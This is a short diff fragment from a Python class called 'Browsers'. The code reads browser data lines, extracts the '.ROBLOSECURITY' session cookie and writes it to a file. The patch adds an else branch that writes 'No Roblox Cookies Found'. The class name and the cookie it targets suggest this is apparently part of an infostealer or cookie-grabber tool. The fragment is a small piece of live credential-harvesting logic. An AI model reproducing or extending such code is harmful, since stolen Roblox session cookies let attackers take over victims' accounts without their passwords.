@@ -584,6 +584,9 @@ class Browsers:
                     if ".ROBLOSECURITY" in line:
                         robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
                         f.write(robo_cookie + "\n")
+                    else:
+                        robo_cookie = "No Roblox Cookies Found"
+                        f.write(robo_cookie)
             f2.close()
         f.close()
 
